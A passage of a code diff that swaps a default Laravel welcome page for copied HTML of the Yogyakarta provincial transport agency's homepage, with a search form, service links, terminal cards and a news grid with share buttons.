		</div>
+		</div></div><div id="sp-topsearch" class="col-xs-1 col-sm-1 col-md-1"><div class="sp-column "><div class="sp-module "><div class="sp-module-content">
+<div style="display:inline-block;" class="top-search-wrapper">
 
-            .position-ref {
-                position: relative;
-            }
+	<div class="icon-top-wrapper">
+		<!--
+        <i class="fa fa-search search-open-icon" aria-hidden="true"></i>
+		<i class="fa fa-times search-close-icon" aria-hidden="true"></i>
+        -->
+        <i class="pe pe-7s-search search-open-icon" aria-hidden="true"></i>
+		<i class="pe pe-7s-close search-close-icon" aria-hidden="true"></i>
+	</div>
 
-            .top-right {
-                position: absolute;
-                right: 10px;
-                top: 18px;
-            }
+	<div class="row top-search-input-wrap" id="top-search-input-wrap">
+		<div class="top-search-wrap">
+			<div class="searchwrapper">
+				<form action="http://dishub.jogjaprov.go.id/" method="post">
+					<div class="search">
+						<div class="top-search-wrapper"><div class="sp_search_input"><input name="searchword" maxlength="200" class="mod-search-searchword inputbox" type="text" size="10" value="Cari berdasarkan kata kunci" onblur="if (this.value==&#39;&#39;) this.value=&#39;Cari berdasarkan kata kunci&#39;;" onfocus="if (this.value==&#39;Cari berdasarkan kata kunci&#39;) this.value=&#39;&#39;;"></div></div>						<input type="hidden" name="task" value="search">
+						<input type="hidden" name="option" value="com_search">
+						<input type="hidden" name="Itemid" value="435">
+					</div>
+				</form>
+			</div> <!-- /.searchwrapper -->
+		</div> <!-- /.col-sm-6 -->
+	</div> <!-- /.row -->
+</div> <!-- /.top-search-wrapper -->	</div></div></div></div></div></div></div></header></div><section id="sp-title"><div class="row"><div id="sp-title" class="col-sm-12 col-md-12"><div class="sp-column "></div></div></div></section><section id="sp-main-body"><div class="row"><div id="sp-component" class="col-sm-12 col-md-12"><div class="sp-column "><div id="system-message-container">
+	</div>
 
-            .content {
-                text-align: center;
-            }
+<div id="sp-page-builder" class="sp-page-builder  page-89">
 
-            .title {
-                font-size: 84px;
-            }
 
-            .links > a {
-                color: #636b6f;
-                padding: 0 25px;
-                font-size: 13px;
-                font-weight: 600;
-                letter-spacing: .1rem;
-                text-decoration: none;
-                text-transform: uppercase;
-            }
+	<div class="page-content">
+				<section id="section-id-1536226128053" class="sppb-section  sppb-hidden-xs sppb-row-have-ext-bg"><div class="sppb-section-bacground-video"><video class="section-bg-video" autoplay="" muted="" webkit-playsinline="" playsinline="" loop="" controlslist="nodownload" poster="/images/2018/07/26/screenshot_21.png"><source src="/images/videos/dishub-jogja-new.mp4" type="video/mp4"></video></div><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12 " id="column-wrap-id-1536226128054"><div id="column-id-1536226128054" class="sppb-column  sppb-wow fadeInUp sppb-animated" data-sppb-wow-duration="1200ms" data-sppb-wow-delay="1400ms" style="visibility: visible; animation-duration: 1200ms; animation-delay: 1400ms; animation-name: fadeInUp;"><div class="sppb-column-addons"><div id="sppb-addon-1536226128055" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1536284713404" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/logo-dishub.png" alt="Image"></div></div></div></div><div id="section-id-1536226128057" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-container-inner"><div class="sppb-row"><div class="sppb-col-md-2" id="column-wrap-id-1536226128058"><div id="column-id-1536226128058" class="sppb-column"><div class="sppb-column-addons"></div></div></div><div class="sppb-col-md-2" id="column-wrap-id-1536284713278"><div id="column-id-1536284713278" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1536226128077" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a href="http://mam.jogjaprov.go.id/atcs"><img class="sppb-img-responsive " src="./dinas/webp.net-resizeimage-2.png" alt="atcs"></a></div></div></div></div></div></div></div><div class="sppb-col-md-2" id="column-wrap-id-1536284713279"><div id="column-id-1536284713279" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1536284713293" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a href="http://si-llajdishubdiy.com/dashboard_laporan_halte"><img class="sppb-img-responsive " src="./dinas/webp.net-resizeimage-3.png" alt="atcs"></a></div></div></div></div></div></div></div><div class="sppb-col-md-2" id="column-wrap-id-1536284713280"><div id="column-id-1536284713280" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1536284713298" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a href="http://lapor.jogjaprov.go.id/"><img class="sppb-img-responsive " src="./dinas/webp.net-resizeimage-4.png" alt="atcs"></a></div></div></div></div></div></div></div><div class="sppb-col-md-2" id="column-wrap-id-1536284713411"><div id="column-id-1536284713411" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1536284713303" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a href="http://si-llajdishubdiy.com/"><img class="sppb-img-responsive " src="./dinas/webp.net-resizeimage-5.png" alt="atcs"></a></div></div></div></div></div></div></div><div class="sppb-col-md-2" id="column-wrap-id-1536284713412"><div id="column-id-1536284713412" class="sppb-column"><div class="sppb-column-addons"></div></div></div></div></div></div></div></div></div></div></div></section><section id="section-id-1536284713413" class="sppb-section  sppb-hidden-md sppb-hidden-lg sppb-row-have-ext-bg" style=""><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12 " id="column-wrap-id-1536284713414"><div id="column-id-1536284713414" class="sppb-column  sppb-wow fadeInUp sppb-animated" data-sppb-wow-duration="1200ms" data-sppb-wow-delay="1400ms" style="visibility: visible; animation-duration: 1200ms; animation-delay: 1400ms; animation-name: fadeInUp;"><div class="sppb-column-addons"><div id="sppb-addon-1536284713415" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1536284713416" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/logo-dishub.png" alt="Image"></div></div></div></div><div id="section-id-1536284713417" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-container-inner"><div class="sppb-row"><div class="sppb-col-md-12" id="column-wrap-id-1536284713418"><div id="column-id-1536284713418" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1536284713722" class="clearfix"><div class="sppb-addon flex desaturate"><div class="slick-carousel-46 clearfix slick-initialized slick-slider"><div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 0px; transform: translate3d(0px, 0px, 0px);"><div class="slick-img slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" tabindex="0" style="width: 0px;"><a href="http://mam.jogjaprov.go.id/atcs" target="_blank" tabindex="0"><img src="./dinas/webp.net-resizeimage-2.png" alt="ATCS"></a><div class="slick-desc"><div style="text-align: center;"><strong>ATCS DIY</strong></div></div></div><div class="slick-img slick-slide slick-active" data-slick-index="1" aria-hidden="false" tabindex="0" style="width: 0px;"><a href="http://si-llajdishubdiy.com/dashboard_laporan_halte" target="_blank" tabindex="0"><img src="./dinas/webp.net-resizeimage-3.png" alt="Halte"></a><div class="slick-desc"><div style="text-align: center;"><strong>Halte</strong></div></div></div><div class="slick-img slick-slide slick-active" data-slick-index="2" aria-hidden="false" tabindex="0" style="width: 0px;"><a href="http://lapor.jogjaprov.go.id/" target="_blank" tabindex="0"><img src="./dinas/webp.net-resizeimage-4.png" alt="E-Lapor"></a><div class="slick-desc"><div style="text-align: center;"><strong>E-Lapor</strong></div></div></div><div class="slick-img slick-slide slick-active" data-slick-index="3" aria-hidden="false" tabindex="0" style="width: 0px;"><a href="http://si-llajdishubdiy.com/" target="_blank" tabindex="0"><img src="./dinas/webp.net-resizeimage-5.png" alt="Sistem Informasi"></a><div class="slick-desc"><div style="text-align: center;"><strong>SI Dishub</strong></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></section><section id="section-id-1482798693" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12" id="column-wrap-id-1482798694"><div id="column-id-1482798694" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1482798695" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div></div></div></div></div></div></section><section id="section-id-1482798696" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-7" id="column-wrap-id-1482798697"><div id="column-id-1482798697" class="sppb-column  sppb-wow fadeInUp sppb-animated" style="visibility: visible; animation-name: fadeInUp;"><div class="sppb-column-addons"><div id="sppb-addon-1482798698" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/info-publik.jpg" alt="Flex Admin"></div></div></div></div></div></div></div><div class="sppb-col-sm-5" id="column-wrap-id-1482798700"><div id="column-id-1482798700" class="sppb-column  sppb-wow fadeInDown sppb-animated" style="visibility: visible; animation-name: fadeInDown;"><div class="sppb-column-addons"><div id="sppb-addon-1482798701" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h3 class="sppb-addon-title">Informasi Publik Untuk Masyarakat</h3><div class="sppb-addon-content"><div style="text-align: justify;">Dinas Perhubungan Provinsi Daerah Istimewa Yogyakarta menyediakan berbagai informasi terkait Perencanaan Pembangunan Daerah sebagai bentuk dukungan terhadap transparansi data.</div></div></div></div><div id="sppb-addon-1529563889874" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="section-id-1529631033611" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-container-inner"><div class="sppb-row"><div class="sppb-col-md-4" id="column-wrap-id-1529631033612"><div id="column-id-1529631033612" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1529631033642" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a target="_blank" href="http://dishub.jogjaprov.go.id/informasi-setiap-saat"><img class="sppb-img-responsive " src="./dinas/check-mark.png" alt="Image" informasi="" setiap="" saat=""></a></div></div><h4 class="sppb-addon-title">Informasi Setiap Saat</h4></div></div></div></div></div><div class="sppb-col-md-4" id="column-wrap-id-1529631033620"><div id="column-id-1529631033620" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1529631033628" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a target="_blank" href="http://dishub.jogjaprov.go.id/informasi-secara-berkala"><img class="sppb-img-responsive " src="./dinas/wall-calendar.png" alt="Image" informasi="" secara="" berkala=""></a></div></div><h4 class="sppb-addon-title">Informasi Secara Berkala</h4></div></div></div></div></div><div class="sppb-col-md-4" id="column-wrap-id-1529631033621"><div id="column-id-1529631033621" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1529631033637" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><a target="_blank" href="http://dishub.jogjaprov.go.id/informasi-serta-merta"><img class="sppb-img-responsive " src="./dinas/school-material.png" alt="Image" informasi="" serta="" merta=""></a></div></div><h4 class="sppb-addon-title">Informasi Serta Merta</h4></div></div></div></div></div></div></div></div></div></div></div></div></div></section><section id="section-id-1482798706" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12" id="column-wrap-id-1482798707"><div id="column-id-1482798707" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1482798708" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div></div></div></div></div></div></section><section id="section-id-1482798709" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-3" id="column-wrap-id-1482798710"><div id="column-id-1482798710" class="sppb-column  shadow border-radius match-height sppb-align-items-center" style="height: 299px;"><div class="sppb-column-addons"><div id="sppb-addon-1482798711" class="sppb-hidden-md sppb-hidden-lg sppb-hidden-sm clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563890011" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h2 class="sppb-addon-title">TERMINAL WATES</h2><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1529563890047" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563890014" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/dsc_0786.jpg" alt="Addspace Header"></div></div></div></div><div id="sppb-addon-1482798714" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1482798716" class="clearfix"><div class="sppb-text-center"><a target="_blank" href="http://dishub.jogjaprov.go.id/terminal-wates" id="btn-1482798716" class="sppb-btn  sppb-btn-custom sppb-btn-rounded" style="margin-left:auto;margin-right:auto;">Info Lengkap</a></div></div></div></div></div><div class="sppb-col-sm-3" id="column-wrap-id-1482798718"><div id="column-id-1482798718" class="sppb-column  shadow border-radius match-height sppb-align-items-center" style="height: 299px;"><div class="sppb-column-addons"><div id="sppb-addon-1482798721" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563889998" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h2 class="sppb-addon-title">TERMINAL JOMBOR</h2><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1529563890067" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563890001" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/dsc_0776.jpg" alt="Addspace Header"></div></div></div></div><div id="sppb-addon-1529563890004" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1482798723" class="clearfix"><div class="sppb-text-center"><a target="_blank" href="http://dishub.jogjaprov.go.id/terminal-jombor" id="btn-1482798723" class="sppb-btn  sppb-btn-custom sppb-btn-rounded" style="margin-left:auto;margin-right:auto;">Info Lengkap</a></div></div></div></div></div><div class="sppb-col-sm-3" id="column-wrap-id-1482798725"><div id="column-id-1482798725" class="sppb-column  shadow border-radius match-height sppb-align-items-center" style="height: 299px;"><div class="sppb-column-addons"><div id="sppb-addon-1482798728" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1482798729" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h2 class="sppb-addon-title">ATCS DIY</h2><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1529563890070" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563889924" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/bdhz477ceaecuk5.jpg" alt="Addspace Header"></div></div></div></div><div id="sppb-addon-1529563889950" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563889961" class="clearfix"><div class="sppb-text-center"><a target="_blank" href="http://dishub.jogjaprov.go.id/atcs-diy" id="btn-1529563889961" class="sppb-btn  sppb-btn-custom sppb-btn-rounded" style="margin-left:auto;margin-right:auto;">Info Lengkap</a></div></div></div></div></div><div class="sppb-col-sm-3" id="column-wrap-id-1482798732"><div id="column-id-1482798732" class="sppb-column  shadow border-radius match-height sppb-align-items-center" style="height: 299px;"><div class="sppb-column-addons"><div id="sppb-addon-1482798735" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563889976" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h2 class="sppb-addon-title">TRANS JOGJA</h2><div class="sppb-addon-content"></div></div></div><div id="sppb-addon-1529563890073" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1529563889983" class="clearfix"><div class="sppb-addon sppb-addon-single-image sppb-text-center "><div class="sppb-addon-content"><div class="sppb-addon-single-image-container"><img class="sppb-img-responsive " src="./dinas/bus-trans.jpg" alt="Addspace Header"></div></div></div></div><div id="sppb-addon-1529563889971" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1530583834899" class="clearfix"><div class="sppb-text-center"><a target="_blank" href="http://dishub.jogjaprov.go.id/trans-jogja" id="btn-1530583834899" class="sppb-btn  sppb-btn-custom sppb-btn-rounded" style="margin-left:auto;margin-right:auto;">Info Lengkap</a></div></div></div></div></div></div></div></section><section id="section-id-1482798740" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12" id="column-wrap-id-1482798741"><div id="column-id-1482798741" class="sppb-column"><div class="sppb-column-addons"><div id="sppb-addon-1482798742" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div></div></div></div></div></div></section><section id="section-id-1482798743" class="sppb-section "><div class="sppb-row-overlay"></div><div class="sppb-row-container"><div class="sppb-row"><div class="sppb-col-sm-12" id="column-wrap-id-1482798744"><div id="column-id-1482798744" class="sppb-column "><div class="sppb-column-addons"><div id="sppb-addon-1482798745" class="clearfix"><div class="sppb-addon sppb-addon-text-block 0 sppb-text-center "><h2 class="sppb-addon-title">Berita Terkini Dishub</h2><div class="sppb-addon-content"><em>Mengenal Yogyakarta lebih dekat lewat berita terkini yang berkaitan dengan Dinas Perhubungan</em></div></div></div><div id="sppb-addon-1482798746" class="clearfix"><div class="sppb-empty-space  clearfix"></div></div><div id="sppb-addon-1530946164625" class="clearfix"><div class="sppb-addon sppb-addon-module "><div class="sppb-addon-content"><div id="ajax_posts_181" class="ajax_posts  clearfix">
+    <div id="masonry_items_181" class="ajax-posts masonry_items row-fluid clearfix" style="position: relative; height: 416px;">
 
-            .m-b-md {
-                margin-bottom: 30px;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="flex-center position-ref full-height">
-            @if (Route::has('login'))
-                <div class="top-right links">
-                    @auth
-                        <a href="{{ url('/home') }}">Home</a>
-                    @else
-                        <a href="{{ route('login') }}">Login</a>
+    	    <article class="post masonry_item col-xs-12 col-sm-4 col-md-3 ajax-post first" itemscope="" itemtype="http://schema.org/Article" style="position: absolute; left: 0px; top: 0px;">
+    <div class="match-height inner" style="height: 386px;">
+            <div class="article_style">
+			<div class="entry-image intro-image"><a href="http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik" itemprop="url"><img class="post-img" src="./dinas/14-12-2018.jpg" alt="Dishub Kota Yogya Pasang Pagar Oranye di Sejumlah Titik" itemprop="thumbnailUrl"></a></div></div>
+   			            <div style="height:15px;" class="clearfix"></div>                <h3 class="aga_heading" itemscope="">
+                <a href="http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik" itemprop="url">
+                    <span itemprop="name">
+                        Dishub Kota Yogya Pasang Pagar Oranye di Sejumlah Titik                    </span>
+                </a>
+                </h3>
 
-                        @if (Route::has('register'))
-                            <a href="{{ route('register') }}">Register</a>
-                        @endif
-                    @endauth
-                </div>
-            @endif
 
-            <div class="content">
-                <div class="title m-b-md">
-                    Laravel
-                </div>
+            <dl class="article-info" itemscope="">
 
-                <div class="links">
-                    <a href="https://laravel.com/docs">Documentation</a>
-                    <a href="https://laracasts.com">Laracasts</a>
-                    <a href="https://laravel-news.com">News</a>
-                    <a href="https://nova.laravel.com">Nova</a>
-                    <a href="https://forge.laravel.com">Forge</a>
-                    <a href="https://github.com/laravel/laravel">GitHub</a>
-                </div>
-            </div>
+
+                                <dd class="published" itemprop="datePublished">
+                <i class="fa fa-calendar-o"></i>
+                <time class="item-time" data-toggle="tooltip" title="" datetime="2018-12-14T08:11:30+00:00" itemprop="dateCreated" data-original-title="Published Date">Friday, 14 December 2018 08:11           		</time>
+                </dd>
+
+				                			</dl>
+
+
+				                    <div class="helix-social-share">
+        <div class="helix-social-share-blog">
+            <ul>
+            	                <li>
+                    <div class="facebook" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Facebook">
+
+                        <a class="facebook" onclick="window.open(&#39;http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik&#39;, &#39;Facebook&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik">
+                            <i class="fa fa-facebook"></i>
+                        </a>
+
+                    </div>
+                </li>
+                				                <li>
+                    <div class="twitter" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Twitter">
+                        <a class="twitter" onclick="window.open(&#39;http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik&amp;text=Dishub%20Kota%20Yogya%20Pasang%20Pagar%20Oranye%20di%20Sejumlah%20Titik&#39;, &#39;Twitter share&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik&amp;text=Dishub%20Kota%20Yogya%20Pasang%20Pagar%20Oranye%20di%20Sejumlah%20Titik">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="google-plus" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Google Plus">
+                        <a class="google-plus" onclick="window.open(&#39;https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik&#39;, &#39;Google plus&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik">
+                            <i class="fa fa-google-plus"></i></a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="linkedin" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Linkedin">
+                        <a class="linkedin" onclick="window.open(&#39;http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik&#39;, &#39;Linkedin&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/dishub-kota-yogya-pasang-pagar-oranye-di-sejumlah-titik">
+                            <i class="fa fa-linkedin"></i></a>
+                    </div>
+                </li>
+                            </ul>
         </div>
-    </body>
-</html>
+    </div> <!-- /.helix-social-share -->
+
+        <div class="clearfix"></div>
+    </div>
+</article>
+
+        <article class="post masonry_item col-xs-12 col-sm-4 col-md-3 ajax-post" itemscope="" itemtype="http://schema.org/Article" style="position: absolute; left: 292px; top: 0px;">
+    <div class="match-height inner" style="height: 386px;">
+            <div class="article_style">
+			<div class="entry-image intro-image"><a href="http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini" itemprop="url"><img class="post-img" src="./dinas/1-12-2018.jpeg" alt="Meluncur! KA Trans Jateng-DIY Resmi Beroperasi Hari Ini" itemprop="thumbnailUrl"></a></div></div>
+   			            <div style="height:15px;" class="clearfix"></div>                <h3 class="aga_heading" itemscope="">
+                <a href="http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini" itemprop="url">
+                    <span itemprop="name">
+                        Meluncur! KA Trans Jateng-DIY Resmi Beroperasi Hari Ini                    </span>
+                </a>
+                </h3>
+
+
+            <dl class="article-info" itemscope="">
+
+
+                                <dd class="published" itemprop="datePublished">
+                <i class="fa fa-calendar-o"></i>
+                <time class="item-time" data-toggle="tooltip" title="" datetime="2018-12-01T09:35:44+00:00" itemprop="dateCreated" data-original-title="Published Date">Saturday, 01 December 2018 09:35           		</time>
+                </dd>
+
+				                			</dl>
+
+
+				                    <div class="helix-social-share">
+        <div class="helix-social-share-blog">
+            <ul>
+            	                <li>
+                    <div class="facebook" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Facebook">
+
+                        <a class="facebook" onclick="window.open(&#39;http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini&#39;, &#39;Facebook&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://www.facebook.com/sharer.php?u=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini">
+                            <i class="fa fa-facebook"></i>
+                        </a>
+
+                    </div>
+                </li>
+                				                <li>
+                    <div class="twitter" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Twitter">
+                        <a class="twitter" onclick="window.open(&#39;http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini&amp;text=Meluncur!%20KA%20Trans%20Jateng-DIY%20Resmi%20Beroperasi%20Hari%20Ini&#39;, &#39;Twitter share&#39;, &#39;width=600,height=300,left=&#39; + (screen.availWidth / 2 - 300) + &#39;,top=&#39; + (screen.availHeight / 2 - 150) + &#39;&#39;); return false;" href="http://twitter.com/share?url=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini&amp;text=Meluncur!%20KA%20Trans%20Jateng-DIY%20Resmi%20Beroperasi%20Hari%20Ini">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="google-plus" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Google Plus">
+                        <a class="google-plus" onclick="window.open(&#39;https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini&#39;, &#39;Google plus&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="https://plus.google.com/share?url=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini">
+                            <i class="fa fa-google-plus"></i></a>
+                    </div>
+                </li>
+                                                <li>
+                    <div class="linkedin" data-toggle="tooltip" data-placement="top" title="" data-original-title="Share On Linkedin">
+                        <a class="linkedin" onclick="window.open(&#39;http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini&#39;, &#39;Linkedin&#39;, &#39;width=585,height=666,left=&#39; + (screen.availWidth / 2 - 292) + &#39;,top=&#39; + (screen.availHeight / 2 - 333) + &#39;&#39;); return false;" href="http://www.linkedin.com/shareArticle?mini=true&amp;url=http://dishub.jogjaprov.go.id/berita/meluncur-ka-trans-jateng-diy-resmi-beroperasi-hari-ini">
+                            <i class="fa fa-linkedin"></i></a>
+                    </div>
+                </li>
+                            </ul>
+        </div>
+    </div> <!-- /.helix-social-share -->
+
+        <div class="clearfix"></div>
+    </div>
+</article>
+
+    	    <article class="post masonry_item col-xs-12 col-sm-4 col-md-3 ajax-post" itemscope="" itemtype="http://schema.org/Article" style="position: absolute; left: 585px; top: 0px;">
+    <div class="match-height inner" style="height: 386px;">
+            <div class="article_style">
+			<div class="entry-image intro-image"><a href="http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy" itemprop="url"><img class="post-img" src="./dinas/27-11-2018.jpg" alt="Becak Listrik Diharapkan Tingkatkan Pariwisata DIY" itemprop="thumbnailUrl"></a></div></div>
+   			            <div style="height:15px;" class="clearfix"></div>                <h3 class="aga_heading" itemscope="">
+                <a href="http://dishub.jogjaprov.go.id/berita/becak-listrik-diharapkan-tingkatkan-pariwisata-diy" itemprop="url">
+                    <span itemprop="name">
+                        Becak Listrik Diharapkan Tingkatkan Pariwisata DIY                    </span>
+                </a>
+                </h3>
+
+
+            <dl class="article-info" itemscope="">
+
+
+                                <dd class="published" itemprop="datePublished">
+                <i class="fa fa-calendar-o"></i>
+                <time class="item-time" data-toggle="tooltip" title="" datetime="2018-11-27T09:22:38+00:00" itemprop="dateCreated" data-original-title="Published Date">Tuesday, 27 November 2018 09:22           		</time>
+                </dd>
+
+				                			</dl>
+
+
+				                    <div class="helix-social-share">
+        <div class="helix-social-share-blog">
+            <ul>
+            	                <li>
